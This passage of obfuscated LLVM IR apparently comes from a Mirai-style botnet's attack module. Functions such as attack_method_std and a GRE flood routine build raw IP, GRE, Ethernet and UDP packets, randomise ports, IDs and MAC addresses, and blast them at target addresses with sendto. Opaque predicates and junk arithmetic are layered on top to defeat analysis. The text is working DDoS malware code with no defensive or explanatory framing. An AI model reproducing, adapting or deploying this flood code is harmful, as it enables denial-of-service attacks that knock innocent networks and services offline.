  %639 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %640 = load i32, i32* %17, align 4
  %641 = sext i32 %640 to i64
  %642 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %639, i64 %641
  %643 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %642, i32 0, i32 0
  %644 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %643, i32 0, i32 0
  store i16 2, i16* %644, align 4
  %645 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %646 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %645, i32 0, i32 9
  %647 = load i32, i32* %646, align 4
  %648 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %649 = load i32, i32* %17, align 4
  %650 = sext i32 %649 to i64
  %651 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %648, i64 %650
  %652 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %651, i32 0, i32 0
  %653 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %652, i32 0, i32 2
  %654 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %653, i32 0, i32 0
  store i32 %647, i32* %654, align 4
  %655 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %656 = load i32, i32* %17, align 4
  %657 = sext i32 %656 to i64
  %658 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %655, i64 %657
  %659 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %658, i32 0, i32 0
  %660 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %659, i32 0, i32 1
  store i16 0, i16* %660, align 2
  %661 = load i32, i32* %18, align 4
  %662 = load i8*, i8** %38, align 8
  %663 = load i32, i32* %26, align 4
  %664 = sext i32 %663 to i64
  %665 = add i64 66, %664
  %666 = bitcast %union.__CONST_SOCKADDR_ARG* %48 to %struct.sockaddr**
  %667 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %668 = load i32, i32* %17, align 4
  %669 = sext i32 %668 to i64
  %670 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %667, i64 %669
  %671 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %670, i32 0, i32 0
  %672 = bitcast %struct.sockaddr_in* %671 to %struct.sockaddr*
  store %struct.sockaddr* %672, %struct.sockaddr** %666, align 8
  %673 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %48, i32 0, i32 0
  %674 = load %struct.sockaddr*, %struct.sockaddr** %673, align 8
  %675 = call i64 @sendto(i32 %661, i8* %662, i64 %665, i32 16384, %struct.sockaddr* %674, i32 16)
  br label %676

; <label>:676:                                    ; preds = %609
  %677 = load i32, i32* @x.21
  %678 = load i32, i32* @y.22
  %679 = sub i32 %677, 1
  %680 = mul i32 %677, %679
  %681 = urem i32 %680, 2
  %682 = icmp eq i32 %681, 0
  %683 = icmp slt i32 %678, 10
  %684 = or i1 %682, %683
  br i1 %684, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %676
  %685 = load i32, i32* %17, align 4
  %686 = add nsw i32 %685, 1
  store i32 %686, i32* %17, align 4
  %687 = load i32, i32* @x.21
  %688 = load i32, i32* @y.22
  %689 = sub i32 %687, 1
  %690 = mul i32 %687, %689
  %691 = urem i32 %690, 2
  %692 = icmp eq i32 %691, 0
  %693 = icmp slt i32 %688, 10
  %694 = or i1 %692, %693
  br i1 %694, label %originalBBpart2115, label %originalBB101alteredBB

originalBBpart2115:                               ; preds = %originalBB101
  br label %369

; <label>:695:                                    ; preds = %369
  br label %368

; <label>:696:                                    ; preds = %124, %102
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %4
  %697 = alloca i8, align 1
  %698 = alloca %struct.attack_target*, align 8
  %699 = alloca i8, align 1
  %700 = alloca %struct.attack_option*, align 8
  %701 = alloca i32, align 4
  %702 = alloca i32, align 4
  %703 = alloca i8**, align 8
  %704 = alloca i8, align 1
  %705 = alloca i16, align 2
  %706 = alloca i8, align 1
  %707 = alloca i8, align 1
  %708 = alloca i16, align 2
  %709 = alloca i16, align 2
  %710 = alloca i32, align 4
  %711 = alloca i8, align 1
  %712 = alloca i8, align 1
  %713 = alloca i32, align 4
  %714 = alloca %struct.iphdr*, align 8
  %715 = alloca %struct.grehdr*, align 8
  %716 = alloca %struct.ethhdr*, align 8
  %717 = alloca %struct.iphdr*, align 8
  %718 = alloca %struct.udphdr*, align 8
  %719 = alloca i32, align 4
  %720 = alloca i32, align 4
  %721 = alloca i32, align 4
  %722 = alloca i8*, align 8
  %723 = alloca %struct.iphdr*, align 8
  %724 = alloca %struct.grehdr*, align 8
  %725 = alloca %struct.ethhdr*, align 8
  %726 = alloca %struct.iphdr*, align 8
  %727 = alloca %struct.udphdr*, align 8
  %728 = alloca i8*, align 8
  %729 = alloca i32, align 4
  %730 = alloca i32, align 4
  %731 = alloca i32, align 4
  %732 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %697, align 1
  store %struct.attack_target* %1, %struct.attack_target** %698, align 8
  store i8 %2, i8* %699, align 1
  store %struct.attack_option* %3, %struct.attack_option** %700, align 8
  %733 = load i8, i8* %697, align 1
  %734 = zext i8 %733 to i64
  %735 = call noalias i8* @calloc(i64 %734, i64 8) #6
  %736 = bitcast i8* %735 to i8**
  store i8** %736, i8*** %703, align 8
  %737 = load i8, i8* %699, align 1
  %738 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %739 = call i32 @attack_get_opt_int(i8 zeroext %737, %struct.attack_option* %738, i8 zeroext 2, i32 0)
  %740 = trunc i32 %739 to i8
  store i8 %740, i8* %704, align 1
  %741 = load i8, i8* %699, align 1
  %742 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %743 = call i32 @attack_get_opt_int(i8 zeroext %741, %struct.attack_option* %742, i8 zeroext 3, i32 65535)
  %744 = trunc i32 %743 to i16
  store i16 %744, i16* %705, align 2
  %745 = load i8, i8* %699, align 1
  %746 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %747 = call i32 @attack_get_opt_int(i8 zeroext %745, %struct.attack_option* %746, i8 zeroext 4, i32 64)
  %748 = trunc i32 %747 to i8
  store i8 %748, i8* %706, align 1
  %749 = load i8, i8* %699, align 1
  %750 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %751 = call i32 @attack_get_opt_int(i8 zeroext %749, %struct.attack_option* %750, i8 zeroext 5, i32 1)
  %752 = trunc i32 %751 to i8
  store i8 %752, i8* %707, align 1
  %753 = load i8, i8* %699, align 1
  %754 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %755 = call i32 @attack_get_opt_int(i8 zeroext %753, %struct.attack_option* %754, i8 zeroext 6, i32 65535)
  %756 = trunc i32 %755 to i16
  store i16 %756, i16* %708, align 2
  %757 = load i8, i8* %699, align 1
  %758 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %759 = call i32 @attack_get_opt_int(i8 zeroext %757, %struct.attack_option* %758, i8 zeroext 7, i32 65535)
  %760 = trunc i32 %759 to i16
  store i16 %760, i16* %709, align 2
  %761 = load i8, i8* %699, align 1
  %762 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %763 = call i32 @attack_get_opt_int(i8 zeroext %761, %struct.attack_option* %762, i8 zeroext 0, i32 512)
  store i32 %763, i32* %710, align 4
  %764 = load i8, i8* %699, align 1
  %765 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %766 = call i32 @attack_get_opt_int(i8 zeroext %764, %struct.attack_option* %765, i8 zeroext 1, i32 1)
  %767 = trunc i32 %766 to i8
  store i8 %767, i8* %711, align 1
  %768 = load i8, i8* %699, align 1
  %769 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %770 = call i32 @attack_get_opt_int(i8 zeroext %768, %struct.attack_option* %769, i8 zeroext 19, i32 0)
  %771 = trunc i32 %770 to i8
  store i8 %771, i8* %712, align 1
  %772 = load i8, i8* %699, align 1
  %773 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %774 = load i32, i32* @LOCAL_ADDR, align 4
  %775 = call i32 @attack_get_opt_int(i8 zeroext %772, %struct.attack_option* %773, i8 zeroext 25, i32 %774)
  store i32 %775, i32* %713, align 4
  %776 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %776, i32* %702, align 4
  %777 = icmp eq i32 %776, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %103
  store i32 1, i32* %17, align 4
  %778 = load i32, i32* %18, align 4
  %779 = bitcast i32* %17 to i8*
  %780 = call i32 @setsockopt(i32 %778, i32 0, i32 3, i8* %779, i32 4) #6
  %781 = icmp eq i32 %780, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %127
  store i32 0, i32* %17, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %149
  %782 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %783 = load i8**, i8*** %19, align 8
  %784 = load i32, i32* %17, align 4
  %785 = sext i32 %784 to i64
  %786 = getelementptr inbounds i8*, i8** %783, i64 %785
  store i8* %782, i8** %786, align 8
  %787 = load i8**, i8*** %19, align 8
  %788 = load i32, i32* %17, align 4
  %789 = sext i32 %788 to i64
  %790 = getelementptr inbounds i8*, i8** %787, i64 %789
  %791 = load i8*, i8** %790, align 8
  %792 = bitcast i8* %791 to %struct.iphdr*
  store %struct.iphdr* %792, %struct.iphdr** %30, align 8
  %793 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %794 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %793, i64 1
  %795 = bitcast %struct.iphdr* %794 to %struct.grehdr*
  store %struct.grehdr* %795, %struct.grehdr** %31, align 8
  %796 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %797 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %796, i64 1
  %798 = bitcast %struct.grehdr* %797 to %struct.ethhdr*
  store %struct.ethhdr* %798, %struct.ethhdr** %32, align 8
  %799 = load %struct.ethhdr*, %struct.ethhdr** %32, align 8
  %800 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %799, i64 1
  %801 = bitcast %struct.ethhdr* %800 to %struct.iphdr*
  store %struct.iphdr* %801, %struct.iphdr** %33, align 8
  %802 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %803 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %802, i64 1
  %804 = bitcast %struct.iphdr* %803 to %struct.udphdr*
  store %struct.udphdr* %804, %struct.udphdr** %34, align 8
  %805 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %806 = bitcast %struct.iphdr* %805 to i8*
  %807 = load i8, i8* %806, align 4
  %_ = sub i8 %807, 15
  %gen = mul i8 %_, 15
  %_11 = sub i8 %807, 15
  %gen12 = mul i8 %_11, 15
  %_13 = shl i8 %807, 15
  %_14 = shl i8 %807, 15
  %_15 = shl i8 %807, 15
  %_16 = sub i8 0, %807
  %gen17 = add i8 %_16, 15
  %808 = and i8 %807, 15
  %_18 = shl i8 %808, 64
  %_19 = shl i8 %808, 64
  %809 = or i8 %808, 64
  store i8 %809, i8* %806, align 4
  %810 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %811 = bitcast %struct.iphdr* %810 to i8*
  %812 = load i8, i8* %811, align 4
  %_20 = shl i8 %812, -16
  %_21 = sub i8 0, %812
  %gen22 = add i8 %_21, -16
  %_23 = sub i8 0, %812
  %gen24 = add i8 %_23, -16
  %_25 = sub i8 0, %812
  %gen26 = add i8 %_25, -16
  %813 = and i8 %812, -16
  %_27 = shl i8 %813, 5
  %_28 = sub i8 %813, 5
  %gen29 = mul i8 %_28, 5
  %_30 = sub i8 %813, 5
  %gen31 = mul i8 %_30, 5
  %_32 = sub i8 %813, 5
  %gen33 = mul i8 %_32, 5
  %_34 = sub i8 %813, 5
  %gen35 = mul i8 %_34, 5
  %_36 = shl i8 %813, 5
  %_37 = sub i8 %813, 5
  %gen38 = mul i8 %_37, 5
  %_39 = sub i8 0, %813
  %gen40 = add i8 %_39, 5
  %_41 = sub i8 0, %813
  %gen42 = add i8 %_41, 5
  %814 = or i8 %813, 5
  store i8 %814, i8* %811, align 4
  %815 = load i8, i8* %20, align 1
  %816 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %817 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %816, i32 0, i32 1
  store i8 %815, i8* %817, align 1
  %818 = load i32, i32* %26, align 4
  %819 = sext i32 %818 to i64
  %_43 = sub i64 66, %819
  %gen44 = mul i64 %_43, %819
  %_45 = sub i64 66, %819
  %gen46 = mul i64 %_45, %819
  %_47 = sub i64 0, 66
  %gen48 = add i64 %_47, %819
  %820 = add i64 66, %819
  %821 = trunc i64 %820 to i16
  %822 = call zeroext i16 @htons(i16 zeroext %821) #7
  %823 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %824 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %823, i32 0, i32 2
  store i16 %822, i16* %824, align 2
  %825 = load i16, i16* %21, align 2
  %826 = call zeroext i16 @htons(i16 zeroext %825) #7
  %827 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %828 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %827, i32 0, i32 3
  store i16 %826, i16* %828, align 4
  %829 = load i8, i8* %22, align 1
  %830 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %831 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %830, i32 0, i32 5
  store i8 %829, i8* %831, align 4
  %832 = load i8, i8* %23, align 1
  %833 = icmp ne i8 %832, 0
  br label %originalBB10

originalBB52alteredBB:                            ; preds = %originalBB52, %274
  %834 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %835 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %836 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %835, i32 0, i32 4
  store i16 %834, i16* %836, align 2
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %332
  %837 = load i32, i32* %17, align 4
  %_57 = sub i32 %837, 1
  %gen58 = mul i32 %_57, 1
  %_59 = sub i32 %837, 1
  %gen60 = mul i32 %_59, 1
  %_61 = sub i32 0, %837
  %gen62 = add i32 %_61, 1
  %_63 = sub i32 %837, 1
  %gen64 = mul i32 %_63, 1
  %_65 = shl i32 %837, 1
  %_66 = shl i32 %837, 1
  %838 = add nsw i32 %837, 1
  store i32 %838, i32* %17, align 4
  br label %originalBB56

originalBB70alteredBB:                            ; preds = %originalBB70, %351
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %374
  %839 = load i8**, i8*** %19, align 8
  %840 = load i32, i32* %17, align 4
  %841 = sext i32 %840 to i64
  %842 = getelementptr inbounds i8*, i8** %839, i64 %841
  %843 = load i8*, i8** %842, align 8
  store i8* %843, i8** %38, align 8
  %844 = load i8*, i8** %38, align 8
  %845 = bitcast i8* %844 to %struct.iphdr*
  store %struct.iphdr* %845, %struct.iphdr** %39, align 8
  %846 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %847 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %846, i64 1
  %848 = bitcast %struct.iphdr* %847 to %struct.grehdr*
  store %struct.grehdr* %848, %struct.grehdr** %40, align 8
  %849 = load %struct.grehdr*, %struct.grehdr** %40, align 8
  %850 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %849, i64 1
  %851 = bitcast %struct.grehdr* %850 to %struct.ethhdr*
  store %struct.ethhdr* %851, %struct.ethhdr** %41, align 8
  %852 = load %struct.ethhdr*, %struct.ethhdr** %41, align 8
  %853 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %852, i64 1
  %854 = bitcast %struct.ethhdr* %853 to %struct.iphdr*
  store %struct.iphdr* %854, %struct.iphdr** %42, align 8
  %855 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %856 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %855, i64 1
  %857 = bitcast %struct.iphdr* %856 to %struct.udphdr*
  store %struct.udphdr* %857, %struct.udphdr** %43, align 8
  %858 = load %struct.udphdr*, %struct.udphdr** %43, align 8
  %859 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %858, i64 1
  %860 = bitcast %struct.udphdr* %859 to i8*
  store i8* %860, i8** %44, align 8
  %861 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %862 = load i32, i32* %17, align 4
  %863 = sext i32 %862 to i64
  %864 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %861, i64 %863
  %865 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %864, i32 0, i32 2
  %866 = load i8, i8* %865, align 4
  %867 = zext i8 %866 to i32
  %868 = icmp slt i32 %867, 32
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %445
  %869 = call i32 @rand_next()
  %870 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %871 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %870, i32 0, i32 8
  store i32 %869, i32* %871, align 4
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %484
  %872 = load i16, i16* %24, align 2
  %873 = zext i16 %872 to i32
  %874 = icmp eq i32 %873, 65535
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %514
  %875 = call i32 @rand_next()
  %_87 = sub i32 %875, 65535
  %gen88 = mul i32 %_87, 65535
  %_89 = shl i32 %875, 65535
  %876 = and i32 %875, 65535
  %877 = trunc i32 %876 to i16
  %878 = load %struct.udphdr*, %struct.udphdr** %43, align 8
  %879 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %878, i32 0, i32 1
  store i16 %877, i16* %879, align 2
  br label %originalBB86

originalBB93alteredBB:                            ; preds = %originalBB93, %536
  %880 = load i8, i8* %28, align 1
  %881 = icmp ne i8 %880, 0
  br label %originalBB93

originalBB97alteredBB:                            ; preds = %originalBB97, %565
  %882 = call i32 @rand_next()
  store i32 %882, i32* %45, align 4
  %883 = call i32 @rand_next()
  store i32 %883, i32* %46, align 4
  %884 = call i32 @rand_next()
  store i32 %884, i32* %47, align 4
  %885 = load %struct.ethhdr*, %struct.ethhdr** %41, align 8
  %886 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %885, i32 0, i32 0
  %887 = getelementptr inbounds [6 x i8], [6 x i8]* %886, i32 0, i32 0
  %888 = bitcast i32* %45 to i8*
  call void @util_memcpy(i8* %887, i8* %888, i32 4)
  %889 = load %struct.ethhdr*, %struct.ethhdr** %41, align 8
  %890 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %889, i32 0, i32 1
  %891 = getelementptr inbounds [6 x i8], [6 x i8]* %890, i32 0, i32 0
  %892 = bitcast i32* %46 to i8*
  call void @util_memcpy(i8* %891, i8* %892, i32 4)
  %893 = load %struct.ethhdr*, %struct.ethhdr** %41, align 8
  %894 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %893, i32 0, i32 0
  %895 = getelementptr inbounds [6 x i8], [6 x i8]* %894, i32 0, i32 0
  %896 = getelementptr inbounds i8, i8* %895, i64 4
  %897 = bitcast i32* %47 to i8*
  call void @util_memcpy(i8* %896, i8* %897, i32 2)
  %898 = load %struct.ethhdr*, %struct.ethhdr** %41, align 8
  %899 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %898, i32 0, i32 1
  %900 = getelementptr inbounds [6 x i8], [6 x i8]* %899, i32 0, i32 0
  %901 = getelementptr inbounds i8, i8* %900, i64 4
  %902 = bitcast i32* %47 to i8*
  %903 = getelementptr inbounds i8, i8* %902, i64 2
  call void @util_memcpy(i8* %901, i8* %903, i32 2)
  %904 = load i8, i8* %27, align 1
  %905 = icmp ne i8 %904, 0
  br label %originalBB97

originalBB101alteredBB:                           ; preds = %originalBB101, %676
  %906 = load i32, i32* %17, align 4
  %_102 = shl i32 %906, 1
  %_103 = shl i32 %906, 1
  %_104 = sub i32 0, %906
  %gen105 = add i32 %_104, 1
  %_106 = shl i32 %906, 1
  %_107 = sub i32 %906, 1
  %gen108 = mul i32 %_107, 1
  %_109 = sub i32 0, %906
  %gen110 = add i32 %_109, 1
  %_111 = shl i32 %906, 1
  %_112 = sub i32 %906, 1
  %gen113 = mul i32 %_112, 1
  %907 = add nsw i32 %906, 1
  store i32 %907, i32* %17, align 4
  br label %originalBB101
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_std(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 1024)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

; <label>:54:                                     ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %55) #7
  store i16 %56, i16* %13, align 2
  br label %57

; <label>:57:                                     ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

; <label>:58:                                     ; preds = %266, %57
  %59 = load i32, i32* @x.23
  %60 = load i32, i32* @y.24
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %58
  %67 = load i32, i32* %9, align 4
  %68 = load i8, i8* %5, align 1
  %69 = zext i8 %68 to i32
  %70 = icmp slt i32 %67, %69
  %71 = load i32, i32* @x.23
  %72 = load i32, i32* @y.24
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %70, label %79, label %269

; <label>:79:                                     ; preds = %originalBBpart2
  %80 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %81 = load i8**, i8*** %10, align 8
  %82 = load i32, i32* %9, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i8*, i8** %81, i64 %83
  store i8* %80, i8** %84, align 8
  %85 = load i16, i16* %12, align 2
  %86 = zext i16 %85 to i32
  %87 = icmp eq i32 %86, 65535
  br i1 %87, label %88, label %113

; <label>:88:                                     ; preds = %79
  %89 = load i32, i32* @x.23
  %90 = load i32, i32* @y.24
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %88
  %97 = call i32 @rand_next()
  %98 = trunc i32 %97 to i16
  %99 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %100 = load i32, i32* %9, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %99, i64 %101
  %103 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %102, i32 0, i32 0
  %104 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %103, i32 0, i32 1
  store i16 %98, i16* %104, align 2
  %105 = load i32, i32* @x.23
  %106 = load i32, i32* @y.24
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %138

; <label>:113:                                    ; preds = %79
  %114 = load i32, i32* @x.23
  %115 = load i32, i32* @y.24
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %113
  %122 = load i16, i16* %12, align 2
  %123 = call zeroext i16 @htons(i16 zeroext %122) #7
  %124 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %125 = load i32, i32* %9, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %124, i64 %126
  %128 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %127, i32 0, i32 0
  %129 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %128, i32 0, i32 1
  store i16 %123, i16* %129, align 2
  %130 = load i32, i32* @x.23
  %131 = load i32, i32* @y.24
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %138

; <label>:138:                                    ; preds = %originalBBpart28, %originalBBpart24
  %139 = call i32 @socket(i32 2, i32 2, i32 0) #6
  %140 = load i32*, i32** %11, align 8
  %141 = load i32, i32* %9, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds i32, i32* %140, i64 %142
  store i32 %139, i32* %143, align 4
  %144 = icmp eq i32 %139, -1
  br i1 %144, label %145, label %146

; <label>:145:                                    ; preds = %138
  ret void

; <label>:146:                                    ; preds = %138
  %147 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %147, align 4
  %148 = load i16, i16* %13, align 2
  %149 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %148, i16* %149, align 2
  %150 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %151 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %150, i32 0, i32 0
  store i32 0, i32* %151, align 4
  %152 = load i32*, i32** %11, align 8
  %153 = load i32, i32* %9, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i32, i32* %152, i64 %154
  %156 = load i32, i32* %155, align 4
  %157 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %158 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %158, %struct.sockaddr** %157, align 8
  %159 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %160 = load %struct.sockaddr*, %struct.sockaddr** %159, align 8
  %161 = call i32 @bind(i32 %156, %struct.sockaddr* %160, i32 16) #6
  %162 = icmp eq i32 %161, -1
  br i1 %162, label %163, label %164

; <label>:163:                                    ; preds = %146
  br label %164

; <label>:164:                                    ; preds = %163, %146
  %165 = load i32, i32* @x.23
  %166 = load i32, i32* @y.24
  %167 = sub i32 %165, 1
